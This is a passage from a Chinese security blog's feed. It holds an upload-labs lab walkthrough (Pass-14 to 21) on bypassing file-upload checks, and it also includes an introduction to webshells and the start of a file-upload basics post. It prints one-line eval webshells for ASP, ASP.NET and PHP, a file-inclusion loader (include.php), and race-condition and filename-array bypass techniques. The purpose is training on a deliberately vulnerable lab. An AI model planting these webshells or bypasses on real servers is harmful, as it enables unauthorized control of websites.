alt="image-20220215171312458"></p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215172941999.png" alt="image-20220215172941999"></p><p><strong>getimagesize() 函数</strong>：将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。函数成功返回的就是一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</p><p>根据源码和提示可知，这里应该是通过检查文件的头部信息去验证（读取判断上传文件的前两个字节）是否是<code>jpg，png</code>或<code>gif</code>格式的图片，页面也提示上传图片码。那这里的思路就是文件包含漏洞进行上传。</p><p>补充知识：</p><p>1.Png图片文件包括8字节：89 50 4E 47 0D 0A 1A 0A。即为 .PNG。<br>2.Jpg图片文件包括2字节：FF D8。<br>3.Gif图片文件包括6字节：47 49 46 38 39|37 61 。即为 GIF89(7)a。<br>4.Bmp图片文件包括2字节：42 4D。即为 BM。</p><h3 id="0x01-9"><a href="#0x01-9" class="headerlink" title="0x01"></a>0x01</h3><p>将2.jpg图片以notepad++打开写入一句话上传：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215174727383.png" alt="image-20220215174727383"></p><h3 id="0x02-6"><a href="#0x02-6" class="headerlink" title="0x02"></a>0x02</h3><p>然后需要在upload目录下新建include.php文件进行读取文件：<br>内容填写：（如果不定义include.php文件不能访问上传的文件）</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'page'</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>之后访问一下地址：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;localhost&#x2F;upload&#x2F;include.php?page&#x3D;6620220215173309.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215174617909.png" alt="image-20220215174617909"></p><h1 id="Pass-15（突破getimagesize）"><a href="#Pass-15（突破getimagesize）" class="headerlink" title="Pass-15（突破getimagesize）"></a>Pass-15（突破getimagesize）</h1><h3 id="0x00-14"><a href="#0x00-14" class="headerlink" title="0x00"></a>0x00</h3><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215180129754.png" alt="image-20220215180129754"></p><p><strong>image_type_to_extension()函数</strong>：（根据指定的图像类型返回对应的后缀名）会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求。</p><p><strong>getimagesize()函数</strong>：取得图像大小。这个函数只接收图像格式信息，若是其他格式则函数返回为<strong>空</strong>，<strong>这样就直接限制了上传文件的类型。</strong></p><h3 id="0x01-10"><a href="#0x01-10" class="headerlink" title="0x01"></a>0x01</h3><p>上传图片马：<br><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215180616334.png" alt="image-20220215180616334"></p><h3 id="0x02-7"><a href="#0x02-7" class="headerlink" title="0x02"></a>0x02</h3><p>访问文件：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215180539273.png" alt="image-20220215180539273"></p><h1 id="Pass-16（突破exif-imagetype）"><a href="#Pass-16（突破exif-imagetype）" class="headerlink" title="Pass-16（突破exif_imagetype）"></a>Pass-16（突破exif_imagetype）</h1><h3 id="0x00-15"><a href="#0x00-15" class="headerlink" title="0x00"></a>0x00</h3><p>源码分析：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215221647985.png" alt="image-20220215221647985"></p><p><strong>exif_imagetype()</strong> 函数：读取一个图像的第一个字节并检查其签名。   只接受图片信息，表示只能上传图片。</p><p>了解函数功能后，这关基本和14，15关没什么区别。</p><h3 id="0x01-11"><a href="#0x01-11" class="headerlink" title="0x01"></a>0x01</h3><p>第一张jpg图片，已上传：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215222020168.png" alt="image-20220215222020168"></p><h3 id="0x02-8"><a href="#0x02-8" class="headerlink" title="0x02"></a>0x02</h3><p>访问文件：<br><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215223215494.png" alt="image-20220215223215494"></p><h1 id="Pass-17（二次渲染）"><a href="#Pass-17（二次渲染）" class="headerlink" title="Pass-17（二次渲染）"></a>Pass-17（二次渲染）</h1><h3 id="0x00-16"><a href="#0x00-16" class="headerlink" title="0x00"></a>0x00</h3><p>源码分析：<br><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215223532933.png" alt="image-20220215223532933"></p><p>三段关于jpg，png，gif的源码；</p><p><code>imagecreatefromjpeg</code> — 由文件或 URL 创建一个新图象。</p><p>看到这个函数，其实这关就是使用二次渲染的过滤。</p><h3 id="0x01-12"><a href="#0x01-12" class="headerlink" title="0x01"></a>0x01</h3><p>先尝试上传图片马，上传成功，14361.jpg。<br><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215224106051.png" alt="image-20220215224106051"></p><h3 id="0x02-9"><a href="#0x02-9" class="headerlink" title="0x02"></a>0x02</h3><p>尝试连接：</p><p>可以看到访问上传的图片只是图片格式：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215224440634.png" alt="image-20220215224440634"></p><p>而原来的图片内容中是有php代码的：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215224341765.png" alt="image-20220215224341765"></p><p>使用notepad++打开上传的文件，果然，没有php代码：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215224415138.png" alt="image-20220215224415138"></p><p>这里应该就是上述函数过滤后的结果，将上传的php代码进行了删除。</p><h3 id="0x03-4"><a href="#0x03-4" class="headerlink" title="0x03"></a>0x03</h3><p><strong>二次渲染绕过原理：</strong></p><p>绕过二次渲染，只需要找到渲染前后没有变化的位置，然后将php代码写进去上传文件，最后可以成功触发php代码。</p><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>可以看到这两部分内容不同：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215230603500.png" alt="image-20220215230603500"></p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215230625814.png" alt="image-20220215230625814"></p><p><strong>绕过方法</strong>：具体实现二次渲染绕过需要写脚本对两张图片进行对比，找到没有被修改的部分插入php代码即可。</p><h1 id="Pass-18（条件竞争）"><a href="#Pass-18（条件竞争）" class="headerlink" title="Pass-18（条件竞争）"></a>Pass-18（条件竞争）</h1><h3 id="0x00-17"><a href="#0x00-17" class="headerlink" title="0x00"></a>0x00</h3><p>源码分析：<br><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215232830235.png" alt="image-20220215232830235"></p><p><strong>unlink() 函数</strong>：删除文件。</p><p>**move_uploaded_file(file,newloc)**：把上传的文件移动到新位置。</p><p>它先将图片上传到服务器，之后，如果临时文件移动到$upload_file，并且文件后缀在jpg，png，gif之间的话，进行重命名，若不在的三者之间就删除文件。</p><h3 id="0x01-13"><a href="#0x01-13" class="headerlink" title="0x01"></a>0x01</h3><p>由于源码当中没有进行二次渲染，所以这里可以上传图片马。</p><p>但作者的本意并非如此，这里主要是考察的是条件竞争；也就是上传的php文件在被删除之前访问就会成功上传文件。通过后门连接，文件就不会被删除。</p><h3 id="0x02-10"><a href="#0x02-10" class="headerlink" title="0x02"></a>0x02</h3><p>先上传一个php文件，抓包，将数据包发送至intruder下，点击clear清除所有标记：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215235007296.png" alt="image-20220215235007296"></p><p>设置为如图：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215235041889.png" alt="image-20220215235041889"></p><p>第一个参数修改为20，开始攻击：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215235417795.png" alt="image-20220215235417795"></p><p>放包，使用其他浏览器一直访问3.php地址；</p><p>疯狂访问，总有那么一瞬间就访问到了：（这里纯手工访问，电脑都快起飞了，最好是跑脚本，方便快捷）</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220216000135839.png" alt="image-20220216000135839"></p><h1 id="Pass-19（条件竞争）"><a href="#Pass-19（条件竞争）" class="headerlink" title="Pass-19（条件竞争）"></a>Pass-19（条件竞争）</h1><h3 id="0x00-18"><a href="#0x00-18" class="headerlink" title="0x00"></a>0x00</h3><p>根据提示，这关需要代码审计，直接查看源码。</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220216101655012.png" alt="image-20220216101655012"></p><p>源码中定义了很多可接受的后缀名：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220216111110688.png" alt="image-20220216111110688"></p><p>在index.php中调用了函数Myupload()：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220216111502575.png" alt="image-20220216111502575"></p><p>之后它会检查文件的拓展名，文件的大小，移动的目录，修改文件名等操作，由源码可以知道做了白名单过滤，这里也利用burp上传图片马，由于条件竞争，程序会出现来不及<strong>rename</strong>的问题，从而上传成功。</p><h3 id="0x01-14"><a href="#0x01-14" class="headerlink" title="0x01"></a>0x01</h3><p>burp设置模块和18关相同。</p><h3 id="0x02-11"><a href="#0x02-11" class="headerlink" title="0x02"></a>0x02</h3><p>可以看到，在另外一个浏览器访问4.jpg文件，（这里以文件包含的地址访问，必须添加include.php），总会有一瞬间服务器来不及<strong>rename</strong>，以4.php文件上传，这时只要访问即可。</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220216165414760.png" alt="image-20220216165414760"></p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220216165441178.png" alt="image-20220216165441178"></p><h1 id="Pass-20（-x2F-绕过）"><a href="#Pass-20（-x2F-绕过）" class="headerlink" title="Pass-20（&#x2F;.绕过）"></a>Pass-20（&#x2F;.绕过）</h1><h3 id="0x00-19"><a href="#0x00-19" class="headerlink" title="0x00"></a>0x00</h3><p>源码分析：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220216165857927.png" alt="image-20220216165857927"></p><p>pathinfo() 函数：以数组的形式返回关于文件路径的信息。</p><p>从源码可以看到文件名路径由post方式提交，应该可以使用00截断绕过；</p><h3 id="0x01-15"><a href="#0x01-15" class="headerlink" title="0x01"></a>0x01</h3><p>抓包，修改文件名添加%00：<br><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220216171049840.png" alt="image-20220216171049840"></p><h3 id="0x02-12"><a href="#0x02-12" class="headerlink" title="0x02"></a>0x02</h3><p>可以看到，3.php已上传：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220216171204861.png" alt="image-20220216171204861"></p><h3 id="0x03-5"><a href="#0x03-5" class="headerlink" title="0x03"></a>0x03</h3><p>访问文件，连接成功：<br><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220216173340667.png" alt="image-20220216173340667"></p><h3 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h3><p>但这关本意并不是考察00截断，由于源码中含有<code>move_uploaded_file()</code>函数，它的特性是会忽略掉文件末尾的<code>/.</code>，所以这里利用这个思路进行绕过。</p><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>抓包修改数据：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220216173859014.png" alt="image-20220216173859014"></p><h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><p>可以看到upload-4.php文件已上传：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220216174003144.png" alt="image-20220216174003144"></p><h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><p>连接文件：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220216174133311.png" alt="image-20220216174133311"></p><h1 id="Pass-21（数组绕过）"><a href="#Pass-21（数组绕过）" class="headerlink" title="Pass-21（数组绕过）"></a>Pass-21（数组绕过）</h1><h3 id="0x00-20"><a href="#0x00-20" class="headerlink" title="0x00"></a>0x00</h3><p>源码分析：</p><pre class="line-numbers language-none"><code class="language-none">$is_upload &#x3D; false;$msg &#x3D; null;if(!empty($_FILES[&#39;upload_file&#39;]))&#123;    &#x2F;&#x2F;检查MIME    $allow_type &#x3D; array(&#39;image&#x2F;jpeg&#39;,&#39;image&#x2F;png&#39;,&#39;image&#x2F;gif&#39;);    if(!in_array($_FILES[&#39;upload_file&#39;][&#39;type&#39;],$allow_type))&#123;        $msg &#x3D; &quot;禁止上传该类型文件!&quot;;    &#125;else&#123;        &#x2F;&#x2F;检查文件名        $file &#x3D; empty($_POST[&#39;save_name&#39;]) ? $_FILES[&#39;upload_file&#39;][&#39;name&#39;] : $_POST[&#39;save_name&#39;];        if (!is_array($file)) &#123;            $file &#x3D; explode(&#39;.&#39;, strtolower($file));        &#125;        $ext &#x3D; end($file);        $allow_suffix &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);        if (!in_array($ext, $allow_suffix)) &#123;            $msg &#x3D; &quot;禁止上传该后缀文件!&quot;;        &#125;else&#123;            $file_name &#x3D; reset($file) . &#39;.&#39; . $file[count($file) - 1];            $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; .$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $msg &#x3D; &quot;文件上传成功！&quot;;                $is_upload &#x3D; true;            &#125; else &#123;                $msg &#x3D; &quot;文件上传失败！&quot;;            &#125;        &#125;    &#125;&#125;else&#123;    $msg &#x3D; &quot;请选择要上传的文件！&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>explode()函数</strong>：把字符串打散为数组：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220216175644626.png" alt="image-20220216175644626"></p><p><strong>strtolower()函数</strong>：将所有字符串转换为小写。</p><p><strong>end() 函数</strong>：将内部指针指向数组中的最后一个元素，并输出。</p><p><strong>reset() 函数</strong>：把数组的内部指针指向第一个元素，并返回这个元素的值。</p><p>这段代码大概意思就是：上传的文件先检查MIME，若是白名单类型则将整个文件的名字后缀通过explode()函数以<code>.</code>为标志分割为数组，之后end()函数检查最后一个数组是否为白名单类型，若是，则上传文件。</p><p>具体效果如下：</p><pre class="line-numbers language-perl" data-language="perl"><code class="language-perl">传空<span class="token operator">/</span>字符串 则取上传文件名 如果上传conn19<span class="token operator">.</span>php<span class="token operator">.</span>jpg，会遇到explode分割为数组<span class="token punctuation">:</span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>conn19<span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>php <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span>jpg <span class="token variable">$ext</span><span class="token operator">=</span>jpg可以过白名单 但是reset<span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token operator">=</span>conn19<span class="token operator">.</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>jpg就是图片了 所以这里应该用到save_name，而且要传数组（传字符串就和空一样效果） 传数组 save_name<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span>conn19<span class="token operator">.</span>php save_name<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">=</span>jpg <span class="token variable">$ext</span><span class="token operator">=</span>jpg过白名单 reset<span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token operator">=</span>conn19<span class="token operator">.</span>php <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考文章：</p><p><a href="https://www.cnblogs.com/SnowSec/p/14258452.html">https://www.cnblogs.com/SnowSec/p/14258452.html</a></p><h3 id="0x01-16"><a href="#0x01-16" class="headerlink" title="0x01"></a>0x01</h3><p>由于源码先要检查MIME，这里就要先修改MIME：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220216185145165.png" alt="image-20220216185145165"></p><h3 id="0x02-13"><a href="#0x02-13" class="headerlink" title="0x02"></a>0x02</h3><p>这里需要修改保存文件的<strong>第三个数组为jpg</strong>进行绕过白名单验证：</p><p><strong>注意：</strong>save_name[2]需要手动添加。</p><p>这是因为抓到的数据包中没有上传到服务器，当上传到服务器时，explode()函数只拆分upload-20为Array[0]，php为Array[1]，但此时我们呢手动添加Array[2]，而源码中end()函数正好取的是最后一个数组的元素，由于最后一个数组的元素被我们手动添加为jpg，则绕过了白名单验证。</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220216185232404.png" alt="image-20220216185232404"></p><h3 id="0x03-6"><a href="#0x03-6" class="headerlink" title="0x03"></a>0x03</h3><p>可以看到文件已上传：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220216185309204.png" alt="image-20220216185309204"></p><h3 id="0x04-2"><a href="#0x04-2" class="headerlink" title="0x04"></a>0x04</h3><p>访问文件：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220216185428434.png" alt="image-20220216185428434"></p><h3 id="0x05-1"><a href="#0x05-1" class="headerlink" title="0x05"></a>0x05</h3><p>这关可以使用图片马进行进行上传：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220216175146929.png" alt="image-20220216175146929"></p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220216175226871.png" alt="image-20220216175226871"></p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220216175330126.png" alt="image-20220216175330126"></p><h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>文件上传方法：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220216192118158.png" alt="image-20220216192118158"></p><p>文件上传过程：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220216192143228.png" alt="image-20220216192143228"></p><p>由此可以看出，白名单要比黑名单安全很多。但是在实战中是没有代码的，绕过的话需要需要一个一个测试。最重要的还是明白上传的思路和方法，还有就是代码审计很重要，看得懂代码就已经成功一半了。</p>]]></content>
      
      
      <categories>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传-Webshell介绍</title>
      <link href="/2022/02/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-Webshell%E4%BB%8B%E7%BB%8D/"/>
      <url>/2022/02/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-Webshell%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h2><p>​        webshell就是以<code>asp、php、jsp</code>或者<code>cgi</code>等<code>网页文件形式</code>存在的一种代码执行环境，主要用于网站管理、服务器管理、权限管理等操作。使用方法简单，只需上传一个代码文件，通过网址访问，便可进行很多日常操作，极大地方便了使用者对网站和服务器的管理。正因如此，也有小部分人将代码修改后当作后门程序使用，以达到控制网站服务器的目的。</p><p>​    在计算机科学中，Shell俗称壳（用来区别于“核”)，是指”为使用者提供操作界面”的软件（命令解释器)。类似于windows系统给的cmd.exe或者linux 下bash 等，虽然这些系统上的命令解释器不止一种。</p><p>webShell是一个网站的后门，也是一个命令解释器，不过是以web方式(HTTP协议）通信（传递命令消息)，继承了web用户的权限。webShell本质上是在服务器端可运行的脚本文件，后缀名为<code>. php/.asp/.aspx/.jsp</code>等，也就是说webShell接收来自于web 用户的命令，然后再服务器端执行。</p><p><strong>说白了，就是获得了网站操作权限。</strong></p><h2 id="Webshell分类"><a href="#Webshell分类" class="headerlink" title="Webshell分类"></a>Webshell分类</h2><h3 id="大马"><a href="#大马" class="headerlink" title="大马"></a>大马</h3><p>webShell 也可以是大马，也是网站木马。有一类webShell之所以叫大马，是因为与小马(一句话木马)区分开，并且代码比较大，但是功能比较丰富。同样，大马有很多种脚本格式，其功能基本相同。每个团队都有自己的定制大马。</p><p>在大马中我们可以进行文件管理，执行系统命令等，还有一些其他定制功能。这是asp 的大马。</p><h3 id="小马"><a href="#小马" class="headerlink" title="小马"></a>小马</h3><p>小马就是一句话木马，因为其代码量比较小，就是一句简单的代码。</p><p>各个脚本的一句话：</p><p>ASP:</p><pre class="line-numbers language-none"><code class="language-none">&lt;%eval- request(“cmd”&quot;)%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ASP.NET:</p><pre class="line-numbers language-none"><code class="language-none">&lt;%@ Page Language&#x3D;&quot;“Jscript”%&gt;&lt;%eval(Request.Item [“cmd”],“unsafe”&quot; ) ;%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>PHP：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php @eval($_REQUEST [ &#39; cmd &#39; ] );?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一句话木马短小精悍，功能强大，但是需要配合中国菜刀或者中国蚁剑客户端使用，中国菜刀是一句话木马的管理器，也是命令操作接口。</p><p>原文链接：<a href="https://blog.csdn.net/Marsper/article/details/109455320">https://blog.csdn.net/Marsper/article/details/109455320</a></p><h2 id="Webshell原理"><a href="#Webshell原理" class="headerlink" title="Webshell原理"></a>Webshell原理</h2><p>  例如：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>基本原理：</strong></p><p>利用文件上传漏洞，往目标网站中上传一句话木马，然后你就可以在本地通过中国菜刀<code>chopper.exe</code>即可获取和控制整个网站目录。@表示后面即使执行错误，也不报错。<code>eval（）</code>函数表示括号内的语句字符串什么的全都当做代码执行。<code>$_POST[&#39;cmd&#39;]</code>表示从页面中获得<code>cmd</code>这个参数值。</p><p><strong>解析一句话木马：</strong></p><p>（1）php的代码要写在<code>&lt;?php ?&gt;</code>里面，服务器才能认出来这是php代码，然后才去解析。<br>（2）<code>@</code>符号的意思是不报错，即使执行错误，也不报错。</p><p>（3）<code>cmd</code>就是密码</p><p>（4）<code>eval()</code>函数：<strong>eval()把字符串作为PHP代码执行</strong>。post方式接收到变量cmd，此时，变量cmd中的字符串被当作php代码来执行。</p><p>可以参考一下这篇文章，讲得很细：</p><p>原文链接：<a href="https://blog.csdn.net/weixin_39190897/article/details/86772765">https://blog.csdn.net/weixin_39190897/article/details/86772765</a></p>]]></content>
      
      
      <categories>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传基础</title>
      <link href="/2022/02/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/02/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>相比于SQL注入等其他漏洞，文件上传漏洞风险更大，最直接的情况则是上传一个webshell拿权限。</p><p><img src="/2022/02/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/image-20220212230901606.png" alt="image-20220212230901606"></p><p>文件上传分类：</p><p><img src="/2022/02/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/image-20220212230917046.png" alt="image-20220212230917046"></p><p>了解到是文件上传漏洞时，要清楚是什么类型的文件上传漏洞，之后进行下一步操作。</p><p>##文件上传漏洞原理：</p><p>网站Web应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的</p><p>实现代码没有严格校验上传文件的后缀和文件类型，此时攻击者就可以上传一个webshell</p><p>到一个Web可访问的目录上，并将恶意文件传递给如PHP解释器去执行，之后就可以在服</p><p>务器上执行恶意代码，进行数据库执行、服务器文件管理，服务器命令执行等恶意操作。</p><p>还有一部分是攻击者通过Web服务器的解析漏洞来突破Web应用程序的防护。</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>1、获取网站权限，控制网站</p><p>2、获取后台账号密码</p><p>3、服务器提权</p><p>4、获取内网权限等</p><h2 id="漏洞如何查找及"><a href="#漏洞如何查找及" class="headerlink" title="漏洞如何查找及"></a>漏洞如何查找及</h2><p>1、黑盒测试：未知网站源码，未知网站情况，扫描敏感文件测试文件上传漏洞</p><p>2、白盒测试：分析源代码查找文件上传功能等</p><p>3、网站中上传头像或者会员中心的上传功能可测试是否有文件上传漏洞</p><p>##前端验证（原理）</p><p>文件上传若是采用前端验证，通过修改前端代码（JS代码）<strong>注释掉或删除掉</strong>（推荐）验证部分可实现上传，或者在<strong>浏览器中禁用JS</strong>（不建议）进行绕过。</p><p><strong>过程</strong>：</p><p>1、将源代码复制到本地删除验证代码再上传</p><p><strong>原理：</strong>由于前端验证就是在本地运行，<strong>但需要在源代码中添加指向上传的地址：<code>action</code>，表示提交给谁（在浏览器中查看原来的请求地址插入到复制的代码中）</strong>，这样就能是实现前端的绕过；</p><p>2、浏览器禁用JS：可能会有其他JS代码控制上传功能，若是禁用JS可能会影响上传操作，因此不推荐使用。</p><p>3、<strong>BP抓包（不怎么靠谱）</strong>：由于网页可能是由<code>JS+PHP</code>代码一起进行上传的功能，这种情况是可能会抓到包；但如果网页都是由<code>JS</code>代码实现提交功能则抓不到数据包，就上传不了服务器。<strong>因为BP是要上传到服务器使服务器进行解析文件，但是<code>JS/HTML</code>等的前端代码是在本地端运行的，根本抓不到数据包。</strong></p><p><strong>（所谓前端验证就是本地验证）</strong></p><p>##文件上传常见验证</p><p> <strong>后缀名，类型，文件头等</strong> 